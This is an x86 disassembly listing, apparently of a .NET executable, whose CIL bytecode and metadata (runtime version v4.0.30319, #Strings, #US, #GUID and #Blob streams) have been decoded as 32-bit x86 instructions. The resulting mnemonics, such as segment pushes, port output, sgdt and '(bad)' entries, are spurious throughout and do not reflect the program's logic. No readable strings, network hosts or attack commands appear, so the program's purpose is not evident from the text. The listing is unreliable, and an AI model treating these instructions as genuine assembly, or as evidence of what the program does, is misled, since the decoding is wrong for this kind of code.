  4069e9:	00 00                	add    %al,(%eax)
  4069eb:	00 01                	add    %al,(%ecx)
  4069ed:	10 00                	adc    %al,(%eax)
  4069ef:	00 00                	add    %al,(%eax)
  4069f1:	00 00                	add    %al,(%eax)
  4069f3:	00 8e 8e 00 0e 24    	add    %cl,0x240e008e(%esi)
  4069f9:	00 00                	add    %al,(%eax)
  4069fb:	01 1e                	add    %ebx,(%esi)
  4069fd:	02 28                	add    (%eax),%ch
  4069ff:	17                   	pop    %ss
  406a00:	00 00                	add    %al,(%eax)
  406a02:	0a 2a                	or     (%edx),%ch
  406a04:	1b 30                	sbb    (%eax),%esi
  406a06:	09 00                	or     %eax,(%eax)
  406a08:	2c 02                	sub    $0x2,%al
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	32 00                	xor    (%eax),%al
  406a0e:	00 11                	add    %dl,(%ecx)
  406a10:	28 6e 00             	sub    %ch,0x0(%esi)
  406a13:	00 0a                	add    %cl,(%edx)
  406a15:	6f                   	outsl  %ds:(%esi),(%dx)
  406a16:	6f                   	outsl  %ds:(%esi),(%dx)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  406a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  406a1d:	00 00                	add    %al,(%eax)
  406a1f:	0a 6f 6f             	or     0x6f(%edi),%ch
  406a22:	00 00                	add    %al,(%eax)
  406a24:	0a 13                	or     (%ebx),%dl
  406a26:	13 12                	adc    (%edx),%edx
  406a28:	13 28                	adc    (%eax),%ebp
  406a2a:	0a 01                	or     (%ecx),%al
  406a2c:	00 0a                	add    %cl,(%edx)
  406a2e:	0a 28                	or     (%eax),%ch
  406a30:	6e                   	outsb  %ds:(%esi),(%dx)
  406a31:	00 00                	add    %al,(%eax)
  406a33:	0a 6f 6f             	or     0x6f(%edi),%ch
  406a36:	00 00                	add    %al,(%eax)
  406a38:	0a 0d 06 12 03 28    	or     0x28031206,%cl
  406a3e:	0b 01                	or     (%ecx),%eax
  406a40:	00 0a                	add    %cl,(%edx)
  406a42:	73 0c                	jae    0x406a50
  406a44:	01 00                	add    %eax,(%eax)
  406a46:	0a 0b                	or     (%ebx),%cl
  406a48:	07                   	pop    %es
  406a49:	28 0d 01 00 0a 13    	sub    %cl,0x130a0001
  406a4f:	07                   	pop    %es
  406a50:	7e a9                	jle    0x4069fb
  406a52:	00 00                	add    %al,(%eax)
  406a54:	0a 28                	or     (%eax),%ch
  406a56:	0e                   	push   %cs
  406a57:	01 00                	add    %eax,(%eax)
  406a59:	0a 13                	or     (%ebx),%dl
  406a5b:	08 11                	or     %dl,(%ecx)
  406a5d:	07                   	pop    %es
  406a5e:	6f                   	outsl  %ds:(%esi),(%dx)
  406a5f:	0f 01 00             	sgdtl  (%eax)
  406a62:	0a 16                	or     (%esi),%dl
  406a64:	16                   	push   %ss
  406a65:	12 02                	adc    (%edx),%al
  406a67:	28 0a                	sub    %cl,(%edx)
  406a69:	01 00                	add    %eax,(%eax)
  406a6b:	0a 12                	or     (%edx),%dl
  406a6d:	02 28                	add    (%eax),%ch
  406a6f:	0b 01                	or     (%ecx),%eax
  406a71:	00 0a                	add    %cl,(%edx)
  406a73:	11 08                	adc    %ecx,(%eax)
  406a75:	6f                   	outsl  %ds:(%esi),(%dx)
  406a76:	0f 01 00             	sgdtl  (%eax)
  406a79:	0a 16                	or     (%esi),%dl
  406a7b:	16                   	push   %ss
  406a7c:	20 20                	and    %ah,(%eax)
  406a7e:	00 cc                	add    %cl,%ah
  406a80:	00 28                	add    %ch,(%eax)
  406a82:	4a                   	dec    %edx
  406a83:	00 00                	add    %al,(%eax)
  406a85:	06                   	push   %es
  406a86:	26 11 07             	adc    %eax,%es:(%edi)
  406a89:	6f                   	outsl  %ds:(%esi),(%dx)
  406a8a:	10 01                	adc    %al,(%ecx)
  406a8c:	00 0a                	add    %cl,(%edx)
  406a8e:	11 08                	adc    %ecx,(%eax)
  406a90:	6f                   	outsl  %ds:(%esi),(%dx)
  406a91:	10 01                	adc    %al,(%ecx)
  406a93:	00 0a                	add    %cl,(%edx)
  406a95:	28 11                	sub    %dl,(%ecx)
  406a97:	01 00                	add    %eax,(%eax)
  406a99:	0a 13                	or     (%ebx),%dl
  406a9b:	0b 11                	or     (%ecx),%edx
  406a9d:	07                   	pop    %es
  406a9e:	13 0c 28             	adc    (%eax,%ebp,1),%ecx
  406aa1:	12 01                	adc    (%ecx),%al
  406aa3:	00 0a                	add    %cl,(%edx)
  406aa5:	13 0a                	adc    (%edx),%ecx
  406aa7:	12 0d 1f 20 1f 20    	adc    0x201f201f,%cl
  406aad:	28 73 00             	sub    %dh,0x0(%ebx)
  406ab0:	00 0a                	add    %cl,(%edx)
  406ab2:	12 03                	adc    (%ebx),%al
  406ab4:	11 0a                	adc    %ecx,(%edx)
  406ab6:	11 0d 28 13 01 00    	adc    %ecx,0x11328
  406abc:	0a 11                	or     (%ecx),%dl
  406abe:	0b 11                	or     (%ecx),%edx
  406ac0:	0c 09                	or     $0x9,%al
  406ac2:	6f                   	outsl  %ds:(%esi),(%dx)
  406ac3:	14 01                	adc    $0x1,%al
  406ac5:	00 0a                	add    %cl,(%edx)
  406ac7:	de 0f                	fimuls (%edi)
  406ac9:	25 28 29 00 00       	and    $0x2928,%eax
  406ace:	0a 13                	or     (%ebx),%dl
  406ad0:	0e                   	push   %cs
  406ad1:	28 2a                	sub    %ch,(%edx)
  406ad3:	00 00                	add    %al,(%eax)
  406ad5:	0a de                	or     %dh,%bl
  406ad7:	00 11                	add    %dl,(%ecx)
  406ad9:	07                   	pop    %es
  406ada:	6f                   	outsl  %ds:(%esi),(%dx)
  406adb:	15 01 00 0a 11       	adc    $0x110a0001,%eax
  406ae0:	08 6f 15             	or     %ch,0x15(%edi)
  406ae3:	01 00                	add    %eax,(%eax)
  406ae5:	0a 07                	or     (%edi),%al
  406ae7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ae8:	16                   	push   %ss
  406ae9:	01 00                	add    %eax,(%eax)
  406aeb:	0a 02                	or     (%edx),%al
  406aed:	28 17                	sub    %dl,(%edi)
  406aef:	01 00                	add    %eax,(%eax)
  406af1:	0a 2c 19             	or     (%ecx,%ebx,1),%ch
  406af4:	07                   	pop    %es
  406af5:	02 73 18             	add    0x18(%ebx),%dh
  406af8:	01 00                	add    %eax,(%eax)
  406afa:	0a 0b                	or     (%ebx),%cl
  406afc:	de 0f                	fimuls (%edi)
  406afe:	25 28 29 00 00       	and    $0x2928,%eax
  406b03:	0a 13                	or     (%ebx),%dl
  406b05:	0f 28 2a             	movaps (%edx),%xmm5
  406b08:	00 00                	add    %al,(%eax)
  406b0a:	0a de                	or     %dh,%bl
  406b0c:	00 73 36             	add    %dh,0x36(%ebx)
  406b0f:	00 00                	add    %al,(%eax)
  406b11:	0a 13                	or     (%ebx),%dl
  406b13:	09 7e 19             	or     %edi,0x19(%esi)
  406b16:	01 00                	add    %eax,(%eax)
  406b18:	0a 03                	or     (%ebx),%al
  406b1a:	6a 73                	push   $0x73
  406b1c:	1a 01                	sbb    (%ecx),%al
  406b1e:	00 0a                	add    %cl,(%edx)
  406b20:	13 05 72 a9 0f 00    	adc    0xfa972,%eax
  406b26:	70 28                	jo     0x406b50
  406b28:	4c                   	dec    %esp
  406b29:	00 00                	add    %al,(%eax)
  406b2b:	06                   	push   %es
  406b2c:	13 04 17             	adc    (%edi,%edx,1),%eax
  406b2f:	73 1b                	jae    0x406b4c
  406b31:	01 00                	add    %eax,(%eax)
  406b33:	0a 13                	or     (%ebx),%dl
  406b35:	06                   	push   %es
  406b36:	11 06                	adc    %eax,(%esi)
  406b38:	6f                   	outsl  %ds:(%esi),(%dx)
  406b39:	1c 01                	sbb    $0x1,%al
  406b3b:	00 0a                	add    %cl,(%edx)
  406b3d:	16                   	push   %ss
  406b3e:	11 05 a2 7e 10 00    	adc    %eax,0x107ea2
  406b44:	00 04 13             	add    %al,(%ebx,%edx,1)
  406b47:	14 16                	adc    $0x16,%al
  406b49:	13 15 11 14 12 15    	adc    0x15121411,%edx
  406b4f:	28 55 00             	sub    %dl,0x0(%ebp)
  406b52:	00 0a                	add    %cl,(%edx)
  406b54:	28 6e 00             	sub    %ch,0x0(%esi)
  406b57:	00 0a                	add    %cl,(%edx)
  406b59:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  406b5b:	00 00                	add    %al,(%eax)
  406b5d:	0a 13                	or     (%ebx),%dl
  406b5f:	13 12                	adc    (%edx),%edx
  406b61:	13 28                	adc    (%eax),%ebp
  406b63:	70 00                	jo     0x406b65
  406b65:	00 0a                	add    %cl,(%edx)
  406b67:	8c 0f                	mov    %cs,(%edi)
  406b69:	00 00                	add    %al,(%eax)
  406b6b:	01 13                	add    %edx,(%ebx)
  406b6d:	10 73 36             	adc    %dh,0x36(%ebx)
  406b70:	00 00                	add    %al,(%eax)
  406b72:	0a 13                	or     (%ebx),%dl
  406b74:	11 07                	adc    %eax,(%edi)
  406b76:	11 11                	adc    %edx,(%ecx)
  406b78:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  406b7b:	06                   	push   %es
  406b7c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b7d:	1d 01 00 0a 72       	sbb    $0x720a0001,%eax
  406b82:	a3 01 00 70 7e       	mov    %eax,0x7e700001
  406b87:	18 00                	sbb    %al,(%eax)
  406b89:	00 04 28             	add    %al,(%eax,%ebp,1)
  406b8c:	66 00 00             	data16 add %al,(%eax)
  406b8f:	0a 11                	or     (%ecx),%dl
  406b91:	11 6f 4c             	adc    %ebp,0x4c(%edi)
  406b94:	00 00                	add    %al,(%eax)
  406b96:	0a 28                	or     (%eax),%ch
  406b98:	37                   	aaa
  406b99:	00 00                	add    %al,(%eax)
  406b9b:	06                   	push   %es
  406b9c:	28 66 00             	sub    %ah,0x0(%esi)
  406b9f:	00 0a                	add    %cl,(%edx)
  406ba1:	7e 18                	jle    0x406bbb
  406ba3:	00 00                	add    %al,(%eax)
  406ba5:	04 28                	add    $0x28,%al
  406ba7:	71 00                	jno    0x406ba9
  406ba9:	00 0a                	add    %cl,(%edx)
  406bab:	11 10                	adc    %edx,(%eax)
  406bad:	14 72                	adc    $0x72,%al
  406baf:	89 01                	mov    %eax,(%ecx)
  406bb1:	00 70 16             	add    %dh,0x16(%eax)
  406bb4:	8d 03                	lea    (%ebx),%eax
  406bb6:	00 00                	add    %al,(%eax)
  406bb8:	01 14 14             	add    %edx,(%esp,%edx,1)
  406bbb:	14 28                	adc    $0x28,%al
  406bbd:	72 00                	jb     0x406bbf
  406bbf:	00 0a                	add    %cl,(%edx)
  406bc1:	28 71 00             	sub    %dh,0x0(%ecx)
  406bc4:	00 0a                	add    %cl,(%edx)
  406bc6:	7e 18                	jle    0x406be0
  406bc8:	00 00                	add    %al,(%eax)
  406bca:	04 28                	add    $0x28,%al
  406bcc:	71 00                	jno    0x406bce
  406bce:	00 0a                	add    %cl,(%edx)
  406bd0:	11 10                	adc    %edx,(%eax)
  406bd2:	14 72                	adc    $0x72,%al
  406bd4:	95                   	xchg   %eax,%ebp
  406bd5:	01 00                	add    %eax,(%eax)
  406bd7:	70 16                	jo     0x406bef
  406bd9:	8d 03                	lea    (%ebx),%eax
  406bdb:	00 00                	add    %al,(%eax)
  406bdd:	01 14 14             	add    %edx,(%esp,%edx,1)
  406be0:	14 28                	adc    $0x28,%al
  406be2:	72 00                	jb     0x406be4
  406be4:	00 0a                	add    %cl,(%edx)
  406be6:	28 71 00             	sub    %dh,0x0(%ecx)
  406be9:	00 0a                	add    %cl,(%edx)
  406beb:	7e 18                	jle    0x406c05
  406bed:	00 00                	add    %al,(%eax)
  406bef:	04 28                	add    $0x28,%al
  406bf1:	71 00                	jno    0x406bf3
  406bf3:	00 0a                	add    %cl,(%edx)
  406bf5:	28 38                	sub    %bh,(%eax)
  406bf7:	00 00                	add    %al,(%eax)
  406bf9:	06                   	push   %es
  406bfa:	28 71 00             	sub    %dh,0x0(%ecx)
  406bfd:	00 0a                	add    %cl,(%edx)
  406bff:	28 3b                	sub    %bh,(%ebx)
  406c01:	00 00                	add    %al,(%eax)
  406c03:	0a 28                	or     (%eax),%ch
  406c05:	1c 00                	sbb    $0x0,%al
  406c07:	00 06                	add    %al,(%esi)
  406c09:	de 0c 11             	fimuls (%ecx,%edx,1)
  406c0c:	11 2c 07             	adc    %ebp,(%edi,%eax,1)
  406c0f:	11 11                	adc    %edx,(%ecx)
  406c11:	6f                   	outsl  %ds:(%esi),(%dx)
  406c12:	59                   	pop    %ecx
  406c13:	00 00                	add    %al,(%eax)
  406c15:	0a dc                	or     %ah,%bl
  406c17:	de 0c 11             	fimuls (%ecx,%edx,1)
  406c1a:	15 2c 07 11 14       	adc    $0x1411072c,%eax
  406c1f:	28 5a 00             	sub    %bl,0x0(%edx)
  406c22:	00 0a                	add    %cl,(%edx)
  406c24:	dc de                	(bad)
  406c26:	0f 25                	(bad)
  406c28:	28 29                	sub    %ch,(%ecx)
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	0a 13                	or     (%ebx),%dl
  406c2e:	12 28                	adc    (%eax),%ch
  406c30:	2a 00                	sub    (%eax),%al
  406c32:	00 0a                	add    %cl,(%edx)
  406c34:	de 00                	fiadds (%eax)
  406c36:	28 60 00             	sub    %ah,0x0(%eax)
  406c39:	00 0a                	add    %cl,(%edx)
  406c3b:	2a 01                	sub    (%ecx),%al
  406c3d:	40                   	inc    %eax
  406c3e:	00 00                	add    %al,(%eax)
  406c40:	00 00                	add    %al,(%eax)
  406c42:	85 00                	test   %eax,(%eax)
  406c44:	34 b9                	xor    $0xb9,%al
  406c46:	00 0f                	add    %cl,(%edi)
  406c48:	24 00                	and    $0x0,%al
  406c4a:	00 01                	add    %al,(%ecx)
  406c4c:	00 00                	add    %al,(%eax)
  406c4e:	e4 00                	in     $0x0,%al
  406c50:	0a ee                	or     %dh,%ch
  406c52:	00 0f                	add    %cl,(%edi)
  406c54:	24 00                	and    $0x0,%al
  406c56:	00 01                	add    %al,(%ecx)
  406c58:	02 00                	add    (%eax),%al
  406c5a:	65 01 96 fb 01 0c 00 	add    %edx,%gs:0xc01fb(%esi)
  406c61:	00 00                	add    %al,(%eax)
  406c63:	00 02                	add    %al,(%edx)
  406c65:	00 3b                	add    %bh,(%ebx)
  406c67:	01 ce                	add    %ecx,%esi
  406c69:	09 02                	or     %eax,(%edx)
  406c6b:	0c 00                	or     $0x0,%al
  406c6d:	00 00                	add    %al,(%eax)
  406c6f:	00 00                	add    %al,(%eax)
  406c71:	00 31                	add    %dh,(%ecx)
  406c73:	01 e6                	add    %esp,%esi
  406c75:	17                   	pop    %ss
  406c76:	02 0f                	add    (%edi),%cl
  406c78:	24 00                	and    $0x0,%al
  406c7a:	00 01                	add    %al,(%ecx)
  406c7c:	13 30                	adc    (%eax),%esi
  406c7e:	03 00                	add    (%eax),%eax
  406c80:	40                   	inc    %eax
  406c81:	00 00                	add    %al,(%eax)
  406c83:	00 33                	add    %dh,(%ebx)
  406c85:	00 00                	add    %al,(%eax)
  406c87:	11 28                	adc    %ebp,(%eax)
  406c89:	1e                   	push   %ds
  406c8a:	01 00                	add    %eax,(%eax)
  406c8c:	0a 0c 16             	or     (%esi,%edx,1),%cl
  406c8f:	0a 08                	or     (%eax),%cl
  406c91:	8e b7 0d 06 09 13    	mov    0x1309060d(%edi),%?
  406c97:	05 13 04 2b 20       	add    $0x202b0413,%eax
  406c9c:	08 11                	or     %dl,(%ecx)
  406c9e:	04 9a                	add    $0x9a,%al
  406ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ca1:	1f                   	pop    %ds
  406ca2:	01 00                	add    %eax,(%eax)
  406ca4:	0a 02                	or     (%edx),%al
  406ca6:	16                   	push   %ss
  406ca7:	28 69 00             	sub    %ch,0x0(%ecx)
  406caa:	00 0a                	add    %cl,(%edx)
  406cac:	16                   	push   %ss
  406cad:	33 07                	xor    (%edi),%eax
  406caf:	08 11                	or     %dl,(%ecx)
  406cb1:	04 9a                	add    $0x9a,%al
  406cb3:	0b 2b                	or     (%ebx),%ebp
  406cb5:	10 11                	adc    %dl,(%ecx)
  406cb7:	04 17                	add    $0x17,%al
  406cb9:	d6                   	salc
  406cba:	13 04 11             	adc    (%ecx,%edx,1),%eax
  406cbd:	04 11                	add    $0x11,%al
  406cbf:	05 31 da 14 0b       	add    $0xb14da31,%eax
  406cc4:	2b 00                	sub    (%eax),%eax
  406cc6:	07                   	pop    %es
  406cc7:	2a 42 53             	sub    0x53(%edx),%al
  406cca:	4a                   	dec    %edx
  406ccb:	42                   	inc    %edx
  406ccc:	01 00                	add    %eax,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	00 00                	add    %al,(%eax)
  406cd2:	00 00                	add    %al,(%eax)
  406cd4:	0c 00                	or     $0x0,%al
  406cd6:	00 00                	add    %al,(%eax)
  406cd8:	76 34                	jbe    0x406d0e
  406cda:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406cdd:	33 30                	xor    (%eax),%esi
  406cdf:	33 31                	xor    (%ecx),%esi
  406ce1:	39 00                	cmp    %eax,(%eax)
  406ce3:	00 00                	add    %al,(%eax)
  406ce5:	00 05 00 6c 00 00    	add    %al,0x6c00
  406ceb:	00 7c 16 00          	add    %bh,0x0(%esi,%edx,1)
  406cef:	00 23                	add    %ah,(%ebx)
  406cf1:	7e 00                	jle    0x406cf3
  406cf3:	00 e8                	add    %ch,%al
  406cf5:	16                   	push   %ss
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	30 1a                	xor    %bl,(%edx)
  406cfa:	00 00                	add    %al,(%eax)
  406cfc:	23 53 74             	and    0x74(%ebx),%edx
  406cff:	72 69                	jb     0x406d6a
  406d01:	6e                   	outsb  %ds:(%esi),(%dx)
  406d02:	67 73 00             	addr16 jae 0x406d05
  406d05:	00 00                	add    %al,(%eax)
  406d07:	00 18                	add    %bl,(%eax)
  406d09:	31 00                	xor    %eax,(%eax)
  406d0b:	00 c0                	add    %al,%al
  406d0d:	0f 00 00             	sldt   (%eax)
  406d10:	23 55 53             	and    0x53(%ebp),%edx
  406d13:	00 d8                	add    %bl,%al
  406d15:	40                   	inc    %eax
  406d16:	00 00                	add    %al,(%eax)
  406d18:	10 00                	adc    %al,(%eax)
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	23 47 55             	and    0x55(%edi),%eax
  406d1f:	49                   	dec    %ecx
  406d20:	44                   	inc    %esp
  406d21:	00 00                	add    %al,(%eax)
  406d23:	00 e8                	add    %ch,%al
  406d25:	40                   	inc    %eax
  406d26:	00 00                	add    %al,(%eax)
  406d28:	0c 09                	or     $0x9,%al
  406d2a:	00 00                	add    %al,(%eax)
  406d2c:	23 42 6c             	and    0x6c(%edx),%eax
  406d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d30:	62 00                	bound  %eax,(%eax)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	00 00                	add    %al,(%eax)
  406d36:	00 00                	add    %al,(%eax)
  406d38:	02 00                	add    (%eax),%al
  406d3a:	00 01                	add    %al,(%ecx)
  406d3c:	57                   	push   %edi
  406d3d:	35 a2 1d 09 0e       	xor    $0xe091da2,%eax
  406d42:	00 00                	add    %al,(%eax)
  406d44:	00 fa                	add    %bh,%dl
  406d46:	25 33 00 16 00       	and    $0x160033,%eax
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 00                	add    %al,(%eax)
  406d4f:	00 96 00 00 00 0f    	add    %dl,0xf000000(%esi)
  406d55:	00 00                	add    %al,(%eax)
  406d57:	00 28                	add    %ch,(%eax)
  406d59:	00 00                	add    %al,(%eax)
  406d5b:	00 56 00             	add    %dl,0x0(%esi)
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	4c                   	dec    %esp
  406d61:	00 00                	add    %al,(%eax)
  406d63:	00 29                	add    %ch,(%ecx)
  406d65:	01 00                	add    %eax,(%eax)
  406d67:	00 40 00             	add    %al,0x0(%eax)
  406d6a:	00 00                	add    %al,(%eax)
  406d6c:	02 00                	add    (%eax),%al
  406d6e:	00 00                	add    %al,(%eax)
  406d70:	33 00                	xor    (%eax),%eax
  406d72:	00 00                	add    %al,(%eax)
  406d74:	03 00                	add    (%eax),%eax
  406d76:	00 00                	add    %al,(%eax)
  406d78:	06                   	push   %es
  406d79:	00 00                	add    %al,(%eax)
  406d7b:	00 07                	add    %al,(%edi)
  406d7d:	00 00                	add    %al,(%eax)
  406d7f:	00 04 00             	add    %al,(%eax,%eax,1)
  406d82:	00 00                	add    %al,(%eax)
  406d84:	0b 00                	or     (%eax),%eax
  406d86:	00 00                	add    %al,(%eax)
  406d88:	05 00 00 00 01       	add    $0x1000000,%eax
  406d8d:	00 00                	add    %al,(%eax)
  406d8f:	00 06                	add    %al,(%esi)
  406d91:	00 00                	add    %al,(%eax)
  406d93:	00 04 00             	add    %al,(%eax,%eax,1)
  406d96:	00 00                	add    %al,(%eax)
  406d98:	03 00                	add    (%eax),%eax
  406d9a:	00 00                	add    %al,(%eax)
  406d9c:	02 00                	add    (%eax),%al
  406d9e:	00 00                	add    %al,(%eax)
  406da0:	00 00                	add    %al,(%eax)
  406da2:	25 1a 01 00 00       	and    $0x11a,%eax
  406da7:	00 00                	add    %al,(%eax)
  406da9:	00 0a                	add    %cl,(%edx)
  406dab:	00 f9                	add    %bh,%cl
  406dad:	00 cf                	add    %cl,%bh
  406daf:	00 0a                	add    %cl,(%edx)
  406db1:	00 2d 01 0f 01 06    	add    %ch,0x6010f01
  406db7:	00 3d 01 36 01 0a    	add    %bh,0xa013601
  406dbd:	00 95 01 cf 00 06    	add    %dl,0x600cf01(%ebp)
  406dc3:	00 13                	add    %dl,(%ebx)
  406dc5:	02 36                	add    (%esi),%dh
  406dc7:	01 06                	add    %eax,(%esi)
  406dc9:	00 bb 02 aa 02 0e    	add    %bh,0xe02aa02(%ebx)
  406dcf:	00 f7                	add    %dh,%bh
  406dd1:	02 e4                	add    %ah,%ah
  406dd3:	02 06                	add    (%esi),%al
  406dd5:	00 33                	add    %dh,(%ebx)
  406dd7:	03 29                	add    (%ecx),%ebp
  406dd9:	03 06                	add    (%esi),%eax
  406ddb:	00 43 03             	add    %al,0x3(%ebx)
  406dde:	aa                   	stos   %al,%es:(%edi)
  406ddf:	02 06                	add    (%esi),%al
  406de1:	00 4e 03             	add    %cl,0x3(%esi)
  406de4:	aa                   	stos   %al,%es:(%edi)
  406de5:	02 06                	add    (%esi),%al
  406de7:	00 82 03 36 01 0e    	add    %al,0xe013603(%edx)
  406ded:	00 e3                	add    %ah,%bl
  406def:	03 d0                	add    %eax,%edx
  406df1:	03 0e                	add    (%esi),%ecx
  406df3:	00 42 04             	add    %al,0x4(%edx)
  406df6:	d0 03                	rolb   $1,(%ebx)
  406df8:	06                   	push   %es
  406df9:	00 05 05 aa 02 12    	add    %al,0x1202aa05
  406dff:	00 11                	add    %dl,(%ecx)
  406e01:	07                   	pop    %es
  406e02:	02 07                	add    (%edi),%al
  406e04:	12 00                	adc    (%eax),%al
  406e06:	3c 07                	cmp    $0x7,%al
  406e08:	25 07 06 00 5c       	and    $0x5c000607,%eax
  406e0d:	07                   	pop    %es
  406e0e:	36 01 06             	add    %eax,%ss:(%esi)
  406e11:	00 88 07 36 01 0e    	add    %cl,0xe013607(%eax)
  406e17:	00 01                	add    %al,(%ecx)
  406e19:	08 eb                	or     %ch,%bl
  406e1b:	07                   	pop    %es
  406e1c:	0e                   	push   %cs
  406e1d:	00 1a                	add    %bl,(%edx)
  406e1f:	08 eb                	or     %ch,%bl
  406e21:	07                   	pop    %es
  406e22:	0e                   	push   %cs
  406e23:	00 47 08             	add    %al,0x8(%edi)
  406e26:	2f                   	das
  406e27:	08 06                	or     %al,(%esi)
  406e29:	00 5e 08             	add    %bl,0x8(%esi)
  406e2c:	d0 03                	rolb   $1,(%ebx)
  406e2e:	0a 00                	or     (%eax),%al
  406e30:	9d                   	popf
  406e31:	08 76 08             	or     %dh,0x8(%esi)
  406e34:	0a 00                	or     (%eax),%al
  406e36:	b5 08                	mov    $0x8,%ch
  406e38:	13 00                	adc    (%eax),%eax
  406e3a:	0e                   	push   %cs
  406e3b:	00 ea                	add    %ch,%dl
  406e3d:	08 cd                	or     %cl,%ch
  406e3f:	08 06                	or     %al,(%esi)
  406e41:	00 1f                	add    %bl,(%edi)
  406e43:	09 ff                	or     %edi,%edi
  406e45:	08 06                	or     %al,(%esi)
  406e47:	00 3d 09 36 01 06    	add    %bh,0x6013609
  406e4d:	00 61 09             	add    %ah,0x9(%ecx)
  406e50:	36 01 0a             	add    %ecx,%ss:(%edx)
  406e53:	00 7a 09             	add    %bh,0x9(%edx)
  406e56:	13 00                	adc    (%eax),%eax
  406e58:	06                   	push   %es
  406e59:	00 b4 09 95 09 06 00 	add    %dh,0x60995(%ecx,%ecx,1)
  406e60:	c8 09 36 01          	enter  $0x3609,$0x1
  406e64:	06                   	push   %es
  406e65:	00 de                	add    %bl,%dh
  406e67:	09 ff                	or     %edi,%edi
  406e69:	08 0e                	or     %cl,(%esi)
  406e6b:	00 0b                	add    %cl,(%ebx)
  406e6d:	0a d0                	or     %al,%dl
  406e6f:	03 06                	add    (%esi),%eax
  406e71:	00 58 0a             	add    %bl,0xa(%eax)
  406e74:	d0 03                	rolb   $1,(%ebx)
  406e76:	06                   	push   %es
  406e77:	00 71 0a             	add    %dh,0xa(%ecx)
  406e7a:	29 03                	sub    %eax,(%ebx)
  406e7c:	06                   	push   %es
  406e7d:	00 7a 0a             	add    %bh,0xa(%edx)
  406e80:	36 01 06             	add    %eax,%ss:(%esi)
  406e83:	00 8a 0a 36 01 97    	add    %cl,-0x68fec9f6(%edx)
  406e89:	00 9b 0a 00 00 06    	add    %bl,0x600000a(%ebx)
  406e8f:	00 b7 0a 29 03 06    	add    %dh,0x603290a(%edi)
  406e95:	00 c8                	add    %cl,%al
  406e97:	0a 36                	or     (%esi),%dh
  406e99:	01 06                	add    %eax,(%esi)
  406e9b:	00 d6                	add    %dl,%dh
  406e9d:	0a 29                	or     (%ecx),%ch
  406e9f:	03 06                	add    (%esi),%eax
  406ea1:	00 e0                	add    %ah,%al
  406ea3:	0a 29                	or     (%ecx),%ch
  406ea5:	03 06                	add    (%esi),%eax
  406ea7:	00 ef                	add    %ch,%bh
  406ea9:	0a 29                	or     (%ecx),%ch
  406eab:	03 0a                	add    (%edx),%ecx
  406ead:	00 0d 0b 76 08 06    	add    %cl,0x608760b
  406eb3:	00 3b                	add    %bh,(%ebx)
  406eb5:	0b aa 02 06 00 52    	or     0x52000602(%edx),%ebp
  406ebb:	0b 36                	or     (%esi),%esi
  406ebd:	01 06                	add    %eax,(%esi)
  406ebf:	00 5e 0b             	add    %bl,0xb(%esi)
  406ec2:	aa                   	stos   %al,%es:(%edi)
  406ec3:	02 06                	add    (%esi),%al
  406ec5:	00 71 0b             	add    %dh,0xb(%ecx)
  406ec8:	36 01 06             	add    %eax,%ss:(%esi)
  406ecb:	00 9f 0b d0 03 06    	add    %bl,0x603d00b(%edi)
  406ed1:	00 bc 0b aa 02 0e 00 	add    %bh,0xe02aa(%ebx,%ecx,1)
  406ed8:	ca 0b e4             	lret   $0xe40b
  406edb:	02 0e                	add    (%esi),%cl
  406edd:	00 d8                	add    %bl,%al
  406edf:	0b e4                	or     %esp,%esp
  406ee1:	02 0e                	add    (%esi),%cl
  406ee3:	00 e3                	add    %ah,%bl
  406ee5:	0b e4                	or     %esp,%esp
  406ee7:	02 06                	add    (%esi),%al
  406ee9:	00 f0                	add    %dh,%al
  406eeb:	0b 36                	or     (%esi),%esi
  406eed:	01 0a                	add    %ecx,(%edx)
  406eef:	00 1e                	add    %bl,(%esi)
  406ef1:	0c 76                	or     $0x76,%al
  406ef3:	08 0e                	or     %cl,(%esi)
  406ef5:	00 3c 0c             	add    %bh,(%esp,%ecx,1)
  406ef8:	e4 02                	in     $0x2,%al
  406efa:	06                   	push   %es
  406efb:	00 48 0c             	add    %cl,0xc(%eax)
  406efe:	aa                   	stos   %al,%es:(%edi)
  406eff:	02 0a                	add    (%edx),%cl
  406f01:	00 5c 0c 0f          	add    %bl,0xf(%esp,%ecx,1)
  406f05:	01 06                	add    %eax,(%esi)
  406f07:	00 8d 0c 36 01 06    	add    %cl,0x601360c(%ebp)
  406f0d:	00 d6                	add    %dl,%dh
  406f0f:	0c 36                	or     $0x36,%al
  406f11:	01 06                	add    %eax,(%esi)
  406f13:	00 f8                	add    %bh,%al
  406f15:	0c 29                	or     $0x29,%al
  406f17:	03 06                	add    (%esi),%eax
  406f19:	00 22                	add    %ah,(%edx)
  406f1b:	0d aa 02 06 00       	or     $0x602aa,%eax
  406f20:	2f                   	das
  406f21:	0d aa 02 0a 00       	or     $0xa02aa,%eax
  406f26:	4c                   	dec    %esp
  406f27:	0d 76 08 06 00       	or     $0x60876,%eax
  406f2c:	7a 0d                	jp     0x406f3b
  406f2e:	aa                   	stos   %al,%es:(%edi)
  406f2f:	02 0e                	add    (%esi),%cl
  406f31:	00 88 0d e4 02 06    	add    %cl,0x602e40d(%eax)
  406f37:	00 a2 0d 36 01 06    	add    %ah,0x601360d(%edx)
  406f3d:	00 b4 0d 36 01 0e 00 	add    %dh,0xe0136(%ebp,%ecx,1)
  406f44:	fc                   	cld
  406f45:	0d d0 03 0a 00       	or     $0xa03d0,%eax
  406f4a:	75 0e                	jne    0x406f5a
  406f4c:	76 08                	jbe    0x406f56
  406f4e:	0e                   	push   %cs
  406f4f:	00 9d 0e 92 0e 06    	add    %bl,0x60e920e(%ebp)
